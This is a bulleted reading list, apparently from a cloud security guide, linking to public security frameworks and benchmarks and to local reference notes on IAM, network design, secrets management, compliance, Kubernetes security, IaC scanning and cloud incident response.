*   [Azure Security Benchmark v3](https://learn.microsoft.com/en-us/security/benchmark/azure/) -- Microsoft's cloud security framework mapped to CIS, NIST, PCI
*   [Google Cloud Security Foundations Guide](https://cloud.google.com/architecture/security-foundations) -- GCP organization, IAM, networking, and key management blueprint
*   [CIS Benchmarks for Cloud](https://www.cisecurity.org/benchmark/) -- AWS, Azure, GCP, Kubernetes CIS benchmarks (foundational compliance)
*   [OWASP Cloud-Native Application Security Top 10](https://owasp.org/www-project-cloud-native-application-security-top-10/) -- Top risks for cloud-native applications
*   [SLSA Framework (Supply-chain Levels for Software Artifacts)](https://slsa.dev/) -- Build provenance and supply chain security for containers and artifacts
*   [/references/cloud-iam-architecture.md](references/cloud-iam-architecture.md) -- AWS IAM roles/policies/boundaries/SCPs, Azure RBAC/PIM, GCP IAM conditions
*   [/references/cloud-network-security.md](references/cloud-network-security.md) -- VPC/VNet/VCN design, security groups vs NACLs, WAF rules, DDoS mitigation
*   [/references/secrets-management-architecture.md](references/secrets-management-architecture.md) -- Secret hierarchy, automatic rotation, JIT credentials, provider comparison
*   [/references/cloud-compliance-automation.md](references/cloud-compliance-automation.md) -- CIS benchmarks, PCI DSS/HIPAA/SOC 2 mapping, compliance-as-code tools
*   [/references/cspm-cnapp-tools.md](references/cspm-cnapp-tools.md) -- CSPM vs CNAPP comparison, Wiz, Orca, Prisma Cloud, Security Hub evaluation
*   [/references/kubernetes-container-security.md](references/kubernetes-container-security.md) -- Pod Security Standards, NetworkPolicy, image signing, runtime protection
*   [/references/iac-security-scanning.md](references/iac-security-scanning.md) -- tfsec, checkov, terrascan, cfn-nag, cfn-guard, pre-commit hooks, CI/CD
*   [/references/cloud-incident-response.md](references/cloud-incident-response.md) -- Cloud forensics, IAM key rotation, blast radius containment, GuardDuty/SCC alerts
